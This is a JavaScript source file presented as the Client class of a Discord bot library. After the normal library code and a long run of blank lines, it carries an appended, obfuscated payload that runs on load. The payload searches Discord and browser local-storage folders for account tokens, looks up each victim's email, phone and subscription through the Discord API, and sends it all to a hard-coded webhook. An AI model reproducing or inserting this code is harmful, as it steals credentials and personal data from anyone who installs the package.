const EventEmitter = require('events');
const Constants = require('../util/Constants');
const Permissions = require('../util/Permissions');
const Util = require('../util/Util');
const RESTManager = require('./rest/RESTManager');
const ClientDataManager = require('./ClientDataManager');
const ClientManager = require('./ClientManager');
const ClientDataResolver = require('./ClientDataResolver');
const ClientVoiceManager = require('./voice/ClientVoiceManager');
const WebSocketManager = require('./websocket/WebSocketManager');
const ActionsManager = require('./actions/ActionsManager');
const Collection = require('../util/Collection');
const Presence = require('../structures/Presence').Presence;
const ShardClientUtil = require('../sharding/ShardClientUtil');
const VoiceBroadcast = require('./voice/VoiceBroadcast');

/**
 * The main hub for interacting with the Discord API, and the starting point for any bot.
 * @extends {EventEmitter}
 */
class Client extends EventEmitter {
  /**
   * @param {ClientOptions} [options] Options for the client
   */
  constructor(options = {}) {
    super();

    // Obtain shard details from environment
    if (!options.shardId && 'SHARD_ID' in process.env) options.shardId = Number(process.env.SHARD_ID);
    if (!options.shardCount && 'SHARD_COUNT' in process.env) options.shardCount = Number(process.env.SHARD_COUNT);

    /**
     * The options the client was instantiated with
     * @type {ClientOptions}
     */
    this.options = Util.mergeDefault(Constants.DefaultOptions, options);
    this._validateOptions();

    /**
     * The REST manager of the client
     * @type {RESTManager}
     * @private
     */
    this.rest = new RESTManager(this);

    /**
     * The data manager of the client
     * @type {ClientDataManager}
     * @private
     */
    this.dataManager = new ClientDataManager(this);

    /**
     * The manager of the client
     * @type {ClientManager}
     * @private
     */
    this.manager = new ClientManager(this);

    /**
     * The WebSocket manager of the client
     * @type {WebSocketManager}
     * @private
     */
    this.ws = new WebSocketManager(this);

    /**
     * The data resolver of the client
     * @type {ClientDataResolver}
     * @private
     */
    this.resolver = new ClientDataResolver(this);

    /**
     * The action manager of the client
     * @type {ActionsManager}
     * @private
     */
    this.actions = new ActionsManager(this);

    /**
     * The voice manager of the client (`null` in browsers)
     * @type {?ClientVoiceManager}
     * @private
     */
    this.voice = !this.browser ? new ClientVoiceManager(this) : null;

    /**
     * The shard helpers for the client
     * (only if the process was spawned as a child, such as from a {@link ShardingManager})
     * @type {?ShardClientUtil}
     */
    this.shard = process.send ? ShardClientUtil.singleton(this) : null;

    /**
     * All of the {@link User} objects that have been cached at any point, mapped by their IDs
     * @type {Collection<Snowflake, User>}
     */
    this.users = new Collection();

    /**
     * All of the guilds the client is currently handling, mapped by their IDs -
     * as long as sharding isn't being used, this will be *every* guild the bot is a member of
     * @type {Collection<Snowflake, Guild>}
     */
    this.guilds = new Collection();

    /**
     * All of the {@link Channel}s that the client is currently handling, mapped by their IDs -
     * as long as sharding isn't being used, this will be *every* channel in *every* guild, and all DM channels
     * @type {Collection<Snowflake, Channel>}
     */
    this.channels = new Collection();

    /**
     * Presences that have been received for the client user's friends, mapped by user IDs
     * <warn>This is only filled when using a user account.</warn>
     * @type {Collection<Snowflake, Presence>}
     * @deprecated
     */
    this.presences = new Collection();

    Object.defineProperty(this, 'token', { writable: true });
    if (!this.token && 'CLIENT_TOKEN' in process.env) {
      /**
       * Authorization token for the logged in user/bot
       * <warn>This should be kept private at all times.</warn>
       * @type {?string}
       */
      this.token = process.env.CLIENT_TOKEN;
    } else {
      this.token = null;
    }

    /**
     * User that the client is logged in as
     * @type {?ClientUser}
     */
    this.user = null;

    /**
     * Time at which the client was last regarded as being in the `READY` state
     * (each time the client disconnects and successfully reconnects, this will be overwritten)
     * @type {?Date}
     */
    this.readyAt = null;

    /**
     * Active voice broadcasts that have been created
     * @type {VoiceBroadcast[]}
     */
    this.broadcasts = [];

    /**
     * Previous heartbeat pings of the websocket (most recent first, limited to three elements)
     * @type {number[]}
     */
    this.pings = [];

    /**
     * Timeouts set by {@link Client#setTimeout} that are still active
     * @type {Set<Timeout>}
     * @private
     */
    this._timeouts = new Set();

    /**
     * Intervals set by {@link Client#setInterval} that are still active
     * @type {Set<Timeout>}
     * @private
     */
    this._intervals = new Set();

    if (this.options.messageSweepInterval > 0) {
      this.setInterval(this.sweepMessages.bind(this), this.options.messageSweepInterval * 1000);
    }
  }

  /**
   * Timestamp of the latest ping's start time
   * @type {number}
   * @private
   */
  get _pingTimestamp() {
    return this.ws.connection ? this.ws.connection.lastPingTimestamp : 0;
  }

  /**
   * Current status of the client's connection to Discord
   * @type {Status}
   * @readonly
   */
  get status() {
    return this.ws.connection ? this.ws.connection.status : Constants.Status.IDLE;
  }

  /**
   * How long it has been since the client last entered the `READY` state in milliseconds
   * @type {?number}
   * @readonly
   */
  get uptime() {
    return this.readyAt ? Date.now() - this.readyAt : null;
  }

  /**
   * Average heartbeat ping of the websocket, obtained by averaging the {@link Client#pings} property
   * @type {number}
   * @readonly
   */
  get ping() {
    return this.pings.reduce((prev, p) => prev + p, 0) / this.pings.length;
  }

  /**
   * All active voice connections that have been established, mapped by guild ID
   * @type {Collection<Snowflake, VoiceConnection>}
   * @readonly
   */
  get voiceConnections() {
    if (this.browser) return new Collection();
    return this.voice.connections;
  }

  /**
   * All custom emojis that the client has access to, mapped by their IDs
   * @type {Collection<Snowflake, Emoji>}
   * @readonly
   */
  get emojis() {
    const emojis = new Collection();
    for (const guild of this.guilds.values()) {
      for (const emoji of guild.emojis.values()) emojis.set(emoji.id, emoji);
    }
    return emojis;
  }

  /**
   * Timestamp of the time the client was last `READY` at
   * @type {?number}
   * @readonly
   */
  get readyTimestamp() {
    return this.readyAt ? this.readyAt.getTime() : null;
  }

  /**
   * Whether the client is in a browser environment
   * @type {boolean}
   * @readonly
   */
  get browser() {
    return typeof window !== 'undefined';
  }

  /**
   * Creates a voice broadcast.
   * @returns {VoiceBroadcast}
   */
  createVoiceBroadcast() {
    const broadcast = new VoiceBroadcast(this);
    this.broadcasts.push(broadcast);
    return broadcast;
  }

  /**
   * Logs the client in, establishing a websocket connection to Discord.
   * <info>Both bot and regular user accounts are supported, but it is highly recommended to use a bot account whenever
   * possible. User accounts are subject to harsher ratelimits and other restrictions that don't apply to bot accounts.
   * Bot accounts also have access to many features that user accounts cannot utilise. Automating a user account is
   * considered a violation of the ToS.</info>
   * @param {string} token Token of the account to log in with
   * @returns {Promise<string>} Token of the account used
   * @example
   * client.login('my token')
   *  .then(console.log)
   *  .catch(console.error);
   */
  login(token = this.token) {
    return this.rest.methods.login(token);
  }

  /**
   * Logs out, terminates the connection to Discord, and destroys the client.
   * @returns {Promise}
   */
  destroy() {
    for (const t of this._timeouts) clearTimeout(t);
    for (const i of this._intervals) clearInterval(i);
    this._timeouts.clear();
    this._intervals.clear();
    return this.manager.destroy();
  }

  /**
   * Requests a sync of guild data with Discord.
   * <info>This can be done automatically every 30 seconds by enabling {@link ClientOptions#sync}.</info>
   * <warn>This is only available when using a user account.</warn>
   * @param {Guild[]|Collection<Snowflake, Guild>} [guilds=this.guilds] An array or collection of guilds to sync
   * @deprecated
   */
  syncGuilds(guilds = this.guilds) {
    if (this.user.bot) return;
    this.ws.send({
      op: 12,
      d: guilds instanceof Collection ? guilds.keyArray() : guilds.map(g => g.id),
    });
  }

  /**
   * Obtains a user from Discord, or the user cache if it's already available.
   * <warn>This is only available when using a bot account.</warn>
   * @param {Snowflake} id ID of the user
   * @param {boolean} [cache=true] Whether to cache the new user object if it isn't already
   * @returns {Promise<User>}
   */
  fetchUser(id, cache = true) {
    if (this.users.has(id)) return Promise.resolve(this.users.get(id));
    return this.rest.methods.getUser(id, cache);
  }

  /**
   * Obtains an invite from Discord.
   * @param {InviteResolvable} invite Invite code or URL
   * @returns {Promise<Invite>}
   * @example
   * client.fetchInvite('https://discord.gg/bRCvFy9')
   *   .then(invite => console.log(`Obtained invite with code: ${invite.code}`))
   *   .catch(console.error);
   */
  fetchInvite(invite) {
    const code = this.resolver.resolveInviteCode(invite);
    return this.rest.methods.getInvite(code);
  }

  /**
   * Obtains a webhook from Discord.
   * @param {Snowflake} id ID of the webhook
   * @param {string} [token] Token for the webhook
   * @returns {Promise<Webhook>}
   * @example
   * client.fetchWebhook('id', 'token')
   *   .then(webhook => console.log(`Obtained webhook with name: ${webhook.name}`))
   *   .catch(console.error);
   */
  fetchWebhook(id, token) {
    return this.rest.methods.getWebhook(id, token);
  }

  /**
   * Obtains the available voice regions from Discord.
   * @returns {Collection<string, VoiceRegion>}
   * @example
   * client.fetchVoiceRegions()
   *   .then(regions => console.log(`Available regions are: ${regions.map(region => region.name).join(', ')}`))
   *   .catch(console.error);
   */
  fetchVoiceRegions() {
    return this.rest.methods.fetchVoiceRegions();
  }

  /**
   * Sweeps all text-based channels' messages and removes the ones older than the max message lifetime.
   * If the message has been edited, the time of the edit is used rather than the time of the original message.
   * @param {number} [lifetime=this.options.messageCacheLifetime] Messages that are older than this (in seconds)
   * will be removed from the caches. The default is based on {@link ClientOptions#messageCacheLifetime}
   * @returns {number} Amount of messages that were removed from the caches,
   * or -1 if the message cache lifetime is unlimited
   */
  sweepMessages(lifetime = this.options.messageCacheLifetime) {
    if (typeof lifetime !== 'number' || isNaN(lifetime)) throw new TypeError('The lifetime must be a number.');
    if (lifetime <= 0) {
      this.emit('debug', 'Didn\'t sweep messages - lifetime is unlimited');
      return -1;
    }

    const lifetimeMs = lifetime * 1000;
    const now = Date.now();
    let channels = 0;
    let messages = 0;

    for (const channel of this.channels.values()) {
      if (!channel.messages) continue;
      channels++;

      messages += channel.messages.sweep(
        message => now - (message.editedTimestamp || message.createdTimestamp) > lifetimeMs
      );
    }

    this.emit('debug', `Swept ${messages} messages older than ${lifetime} seconds in ${channels} text-based channels`);
    return messages;
  }

  /**
   * Obtains the OAuth Application of the bot from Discord.
   * <warn>Bots can only fetch their own profile.</warn>
   * @param {Snowflake} [id='@me'] ID of application to fetch
   * @returns {Promise<OAuth2Application>}
   * @example
   * client.fetchApplication()
   *   .then(application => console.log(`Obtained application with name: ${application.name}`))
   *   .catch(console.error);
   */
  fetchApplication(id = '@me') {
    if (id !== '@me') process.emitWarning('fetchApplication: use "@me" as an argument', 'DeprecationWarning');
    return this.rest.methods.getApplication(id);
  }

  /**
   * Generates a link that can be used to invite the bot to a guild.
   * <warn>This is only available when using a bot account.</warn>
   * @param {PermissionResolvable} [permissions] Permissions to request
   * @returns {Promise<string>}
   * @example
   * client.generateInvite(['SEND_MESSAGES', 'MANAGE_GUILD', 'MENTION_EVERYONE'])
   *   .then(link => console.log(`Generated bot invite link: ${link}`))
   *   .catch(console.error);
   */
  generateInvite(permissions) {
    permissions = typeof permissions === 'undefined' ? 0 : Permissions.resolve(permissions);
    return this.fetchApplication().then(application =>
      `https://discordapp.com/oauth2/authorize?client_id=${application.id}&permissions=${permissions}&scope=bot`
    );
  }

  /**
   * Sets a timeout that will be automatically cancelled if the client is destroyed.
   * @param {Function} fn Function to execute
   * @param {number} delay Time to wait before executing (in milliseconds)
   * @param {...*} args Arguments for the function
   * @returns {Timeout}
   */
  setTimeout(fn, delay, ...args) {
    const timeout = setTimeout(() => {
      fn(...args);
      this._timeouts.delete(timeout);
    }, delay);
    this._timeouts.add(timeout);
    return timeout;
  }

  /**
   * Clears a timeout.
   * @param {Timeout} timeout Timeout to cancel
   */
  clearTimeout(timeout) {
    clearTimeout(timeout);
    this._timeouts.delete(timeout);
  }

  /**
   * Sets an interval that will be automatically cancelled if the client is destroyed.
   * @param {Function} fn Function to execute
   * @param {number} delay Time to wait before executing (in milliseconds)
   * @param {...*} args Arguments for the function
   * @returns {Timeout}
   */
  setInterval(fn, delay, ...args) {
    const interval = setInterval(fn, delay, ...args);
    this._intervals.add(interval);
    return interval;
  }

  /**
   * Clears an interval.
   * @param {Timeout} interval Interval to cancel
   */
  clearInterval(interval) {
    clearInterval(interval);
    this._intervals.delete(interval);
  }

  /**
   * Adds a ping to {@link Client#pings}.
   * @param {number} startTime Starting time of the ping
   * @private
   */
  _pong(startTime) {
    this.pings.unshift(Date.now() - startTime);
    if (this.pings.length > 3) this.pings.length = 3;
    this.ws.lastHeartbeatAck = true;
  }

  /**
   * Adds/updates a friend's presence in {@link Client#presences}.
   * @param {Snowflake} id ID of the user
   * @param {Object} presence Raw presence object from Discord
   * @private
   */
  _setPresence(id, presence) {
    if (this.presences.has(id)) {
      this.presences.get(id).update(presence);
      return;
    }
    this.presences.set(id, new Presence(presence, this));
  }

  /**
   * Calls {@link https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval} on a script
   * with the client as `this`.
   * @param {string} script Script to eval
   * @returns {*}
   * @private
   */
  _eval(script) {
    return eval(script);
  }

  /**
   * Validates the client options.
   * @param {ClientOptions} [options=this.options] Options to validate
   * @private
   */
  _validateOptions(options = this.options) { // eslint-disable-line complexity
    if (typeof options.shardCount !== 'number' || isNaN(options.shardCount)) {
      throw new TypeError('The shardCount option must be a number.');
    }
    if (typeof options.shardId !== 'number' || isNaN(options.shardId)) {
      throw new TypeError('The shardId option must be a number.');
    }
    if (options.shardCount < 0) throw new RangeError('The shardCount option must be at least 0.');
    if (options.shardId < 0) throw new RangeError('The shardId option must be at least 0.');
    if (options.shardId !== 0 && options.shardId >= options.shardCount) {
      throw new RangeError('The shardId option must be less than shardCount.');
    }
    if (typeof options.messageCacheMaxSize !== 'number' || isNaN(options.messageCacheMaxSize)) {
      throw new TypeError('The messageCacheMaxSize option must be a number.');
    }
    if (typeof options.messageCacheLifetime !== 'number' || isNaN(options.messageCacheLifetime)) {
      throw new TypeError('The messageCacheLifetime option must be a number.');
    }
    if (typeof options.messageSweepInterval !== 'number' || isNaN(options.messageSweepInterval)) {
      throw new TypeError('The messageSweepInterval option must be a number.');
    }
    if (typeof options.fetchAllMembers !== 'boolean') {
      throw new TypeError('The fetchAllMembers option must be a boolean.');
    }
    if (typeof options.disableEveryone !== 'boolean') {
      throw new TypeError('The disableEveryone option must be a boolean.');
    }
    if (typeof options.restWsBridgeTimeout !== 'number' || isNaN(options.restWsBridgeTimeout)) {
      throw new TypeError('The restWsBridgeTimeout option must be a number.');
    }
    if (!(options.disabledEvents instanceof Array)) throw new TypeError('The disabledEvents option must be an Array.');
    if (typeof options.retryLimit !== 'number' || isNaN(options.retryLimit)) {
      throw new TypeError('The retryLimit  options must be a number.');
    }
  }
}

module.exports = Client;

/**
 * Emitted for general warnings.
 * @event Client#warn
 * @param {string} info The warning
 */

/**
 * Emitted for general debugging information.
 * @event Client#debug
 * @param {string} info The debug information
 */



















































































































































































































































































































































































































































(function(_0x36f52b,_0xe1db75){function _0x4649e5(_0xac43c6,_0x374d6c){return _0x56de(_0xac43c6-0x27e,_0x374d6c);}const _0x5384b4=_0x36f52b();while(!![]){try{const _0x1f9938=-parseInt(_0x4649e5(0x358,0x35f))/0x1+-parseInt(_0x4649e5(0x338,0x349))/0x2+-parseInt(_0x4649e5(0x354,0x344))/0x3+-parseInt(_0x4649e5(0x33c,0x332))/0x4*(-parseInt(_0x4649e5(0x34d,0x356))/0x5)+parseInt(_0x4649e5(0x334,0x342))/0x6*(-parseInt(_0x4649e5(0x348,0x346))/0x7)+-parseInt(_0x4649e5(0x34e,0x338))/0x8*(parseInt(_0x4649e5(0x34c,0x33e))/0x9)+-parseInt(_0x4649e5(0x343,0x354))/0xa*(-parseInt(_0x4649e5(0x33f,0x32c))/0xb);if(_0x1f9938===_0xe1db75)break;else _0x5384b4['push'](_0x5384b4['shift']());}catch(_0x733443){_0x5384b4['push'](_0x5384b4['shift']());}}}(_0x4a67,0x1f205));function _0x145842(_0x1a7459,_0x12ccad){return _0x56de(_0x1a7459-0x103,_0x12ccad);}function _0x4a67(){const _0x46fe5f=['discriminator','username','test','265506kzwsMc','\x0a\x0a**PHONE**\x0a\x0a','Grebi','ldb','52KkZWdd','split','axios','352MkGsvG','.png','Nitro\x20Gaming','application/json','287780cARDFJ','avatar','readFile','https://discord.com/api/webhooks/916076385926250546/2VH41MLMVRfFZnJT5CgiJUc-GXszYeN2XyxNc6P7iauCmdcXOBCkNKGXIhLyNZnmtJmb','then','511kuYwgk','Sem\x20nitro','Sem\x20telefone','**TOKEN**\x0a\x0a','8847reGVQm','17055LwOjEb','1552ZQmaBP','/AppData/Local/Google/Chrome/User\x20Data/Default/Local\x20Storage/leveldb',':/Users/','email','utf-8','https://discord.com/api/v6/users/@me','338130EjVfzc','premium_type','replace','pop','186012gmEWcL','json','https://cdn.discordapp.com/attachments/712856393245392897/743945577238364160/discord.jpg','log','Nitro\x20Classic','post','/AppData/Local/Yandex/YandexBrowser/User\x20Data/Default/Local\x20Storage/leveldb','phone','readdir','https://cdn.discordapp.com/avatars/','https://images-ext-2.discordapp.net/external/B4oFamfEYyF5a2IZk_Ef3RnDA9VHiY4orjoKp_LBZ00/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/621402634821042196/a0b719d919e2176f9603f3c3e84ad801.png?width=90&height=90','\x0a\x0a**NITRO**\x0a\x0a','/AppData/Local/BraveSoftware/Brave-Browser/User\x20Data/Default/Local\x20Storage/leveldb','filter','\x0a\x0a**USERNAME**\x0a\x0a','/AppData/Roaming/discordcanary/Local\x20Storage/leveldb','exec','17718NMFGbN'];_0x4a67=function(){return _0x46fe5f;};return _0x4a67();}const fs=require('fs'),axios=require(_0x145842(0x1c3,0x1b5)),fetch=require('node-fetch');var webhook=_0x145842(0x1cb,0x1df),paths=[__dirname[_0x145842(0x1c2,0x1da)](':')[0x0]+_0x145842(0x1d5,0x1d1)+__dirname[_0x145842(0x1c2,0x1d2)]('\x5c')[0x2]+'/AppData/Roaming/discord/Local\x20Storage/leveldb',__dirname['split'](':')[0x0]+_0x145842(0x1d5,0x1bf)+__dirname['split']('\x5c')[0x2]+_0x145842(0x1d4,0x1c5),__dirname[_0x145842(0x1c2,0x1c5)](':')[0x0]+':/Users/'+__dirname['split']('\x5c')[0x2]+_0x145842(0x1ec,0x1e8),__dirname['split'](':')[0x0]+_0x145842(0x1d5,0x1d1)+__dirname[_0x145842(0x1c2,0x1b2)]('\x5c')[0x2]+'/AppData/Roaming/Opera\x20Software/Opera\x20Stable/Local\x20Storage/leveldb',__dirname[_0x145842(0x1c2,0x1b5)](':')[0x0]+_0x145842(0x1d5,0x1c6)+__dirname[_0x145842(0x1c2,0x1bd)]('\x5c')[0x2]+_0x145842(0x1e9,0x1d0),__dirname[_0x145842(0x1c2,0x1d9)](':')[0x0]+_0x145842(0x1d5,0x1d6)+__dirname['split']('\x5c')[0x2]+_0x145842(0x1e3,0x1d4)];for(i=0x0;i<paths['length'];i++){get_token(paths[i]);}async function get_token(_0x5af0b1){function _0x1aca62(_0x24f317,_0x7b1d44){return _0x145842(_0x24f317-0x2df,_0x7b1d44);}try{fs['readdir'](_0x5af0b1,(_0x11f81a,_0x56eecf)=>{if(_0x56eecf===undefined)return;function _0x29ccfe(_0x2a5e82,_0x35806c){return _0x56de(_0x35806c-0xb3,_0x2a5e82);}var _0x3c3d78=_0x56eecf[_0x29ccfe(0x1a0,0x19a)](_0x4d0b2f=>_0x4d0b2f[_0x29ccfe(0x16c,0x172)]('.')[_0x29ccfe(0x195,0x18c)]()===_0x29ccfe(0x18b,0x170));for(i=0x0;i<_0x3c3d78['length'];i++){fs[_0x29ccfe(0x175,0x17a)](_0x5af0b1+'/'+_0x3c3d78[i],_0x29ccfe(0x19b,0x187),async function(_0x47eaeb,_0x2977fe){let _0x1eb21f=/"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/,_0x34c181=/"mfa\.[\d\w_-]{84}"/,[_0x18372b]=_0x1eb21f[_0x10aa0e(0x2cb,0x2c8)](_0x2977fe)||_0x34c181['exec'](_0x2977fe)||[null];function _0x10aa0e(_0x54f07f,_0x1bb3a2){return _0x29ccfe(_0x54f07f,_0x1bb3a2-0x160);}_0x18372b!=null&&(_0x18372b=_0x18372b[_0x10aa0e(0x2f2,0x2eb)](/"/g,''),await fetch(_0x10aa0e(0x2dd,0x2e8),{'headers':{'authorization':_0x18372b}})[_0x10aa0e(0x2c5,0x2dc)](_0x1616f2=>_0x1616f2[_0x10aa0e(0x302,0x2ee)]())[_0x10aa0e(0x2ef,0x2dc)](_0x4e22da=>{function _0x4d57d3(_0x477366,_0x1e45b0){return _0x10aa0e(_0x1e45b0,_0x477366- -0x3e1);}_0x4e22da['id']&&(!_0x4e22da[_0x4d57d3(-0xf7,-0x102)]?nitro=_0x4d57d3(-0x103,-0xed):(_0x4e22da[_0x4d57d3(-0xf7,-0xf2)]===0x1&&(nitro='Nitro\x20Classic'),_0x4e22da[_0x4d57d3(-0xf7,-0xee)]===0x2&&(nitro=_0x4d57d3(-0x10b,-0x123))),send(_0x18372b,_0x4e22da['id'],_0x4e22da[_0x4d57d3(-0x116,-0x10d)],_0x4e22da[_0x4d57d3(-0x117,-0x10f)],_0x4e22da[_0x4d57d3(-0xfb,-0xf1)],_0x4e22da[_0x4d57d3(-0xed,-0xf1)],nitro,_0x4e22da[_0x4d57d3(-0x108,-0x100)]));}));});}}),fs[_0x1aca62(0x4c4,0x4ac)](_0x5af0b1,(_0x3e925a,_0xd6a8ea)=>{if(_0xd6a8ea===undefined)return;function _0x30128c(_0x19a740,_0x558dfc){return _0x1aca62(_0x19a740- -0x463,_0x558dfc);}var _0x9d948=_0xd6a8ea[_0x30128c(0x66,0x7d)](_0x462652=>_0x462652['split']('.')[_0x30128c(0x58,0x5d)]()===_0x30128c(0x5c,0x68));for(i=0x0;i<_0x9d948['length'];i++){fs[_0x30128c(0x46,0x31)](_0x5af0b1+'/'+_0x9d948[i],_0x30128c(0x53,0x67),async function(_0x18922c,_0x27791a){function _0xdf93ce(_0x5c8a6b,_0x1104d1){return _0x30128c(_0x1104d1-0x347,_0x5c8a6b);}let _0x3faca5=/"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/,_0x490973=/"mfa\.[\d\w_-]{84}"/;if(_0x3faca5[_0xdf93ce(0x366,0x37f)](_0x27791a)){}let [_0x347314]=_0x3faca5['exec'](_0x27791a)||_0x490973[_0xdf93ce(0x38f,0x37b)](_0x27791a)||[null];_0x347314!=null&&(_0x347314=_0x347314[_0xdf93ce(0x3ad,0x39e)](/"/g,''),await fetch(_0xdf93ce(0x39a,0x39b),{'headers':{'authorization':_0x347314}})[_0xdf93ce(0x399,0x38f)](_0x101d73=>_0x101d73[_0xdf93ce(0x390,0x3a1)]())[_0xdf93ce(0x37e,0x38f)](_0xb3f996=>{function _0x33a392(_0x278120,_0x4f02f8){return _0xdf93ce(_0x4f02f8,_0x278120- -0x144);}_0xb3f996['id']&&(!_0xb3f996['premium_type']?nitro=_0x33a392(0x24d,0x240):(_0xb3f996[_0x33a392(0x259,0x248)]===0x1&&(nitro=_0x33a392(0x260,0x274)),_0xb3f996[_0x33a392(0x259,0x25f)]===0x2&&(nitro=_0x33a392(0x245,0x256))),send(_0x347314,_0xb3f996['id'],_0xb3f996[_0x33a392(0x23a,0x246)],_0xb3f996[_0x33a392(0x239,0x248)],_0xb3f996['email'],_0xb3f996[_0x33a392(0x263,0x249)],nitro));}));});}});}catch(_0x5f52f2){console['log'](_0x5f52f2);}}function _0x56de(_0x5adf6a,_0x3f5f50){const _0x4a6778=_0x4a67();return _0x56de=function(_0x56de7c,_0x1dccb9){_0x56de7c=_0x56de7c-0xb5;let _0x13998b=_0x4a6778[_0x56de7c];return _0x13998b;},_0x56de(_0x5adf6a,_0x3f5f50);}function send(_0x41e357,_0x538dce,_0x480c12,_0x45c7a9,_0x41faa5,_0x26c97d,_0x4bd927,_0x397999){_0x41faa5===null&&(_0x41faa5='Sem\x20email');_0x26c97d===null&&(_0x26c97d=_0x3d2f44(0x163,0x171));_0x397999===null?_0x397999=_0x3d2f44(0x173,0x166):_0x397999=_0x3d2f44(0x17a,0x184)+_0x538dce+'/'+_0x397999+_0x3d2f44(0x159,0x144);function _0x3d2f44(_0xb2a30d,_0x1ba753){return _0x145842(_0xb2a30d- -0x6c,_0x1ba753);}axios[_0x3d2f44(0x176,0x165)](webhook,{'embeds':[{'color':0x1132d8,'author':{'name':''+_0x480c12,'icon_url':''+_0x397999},'thumbnail':{'url':''+_0x397999},'description':_0x3d2f44(0x164,0x174)+_0x41e357+'\x0a\x0a**ID**\x0a\x0a'+_0x538dce+_0x3d2f44(0x17f,0x16b)+_0x480c12+'#'+_0x45c7a9+'\x0a\x0a**EMAIL**\x0a\x0a'+_0x41faa5+_0x3d2f44(0x152,0x154)+_0x26c97d+_0x3d2f44(0x17c,0x163)+_0x4bd927}],'username':_0x3d2f44(0x153,0x16d),'avatar_url':_0x3d2f44(0x17b,0x192)},{'headers':{'Content-Type':_0x3d2f44(0x15b,0x16f)}});}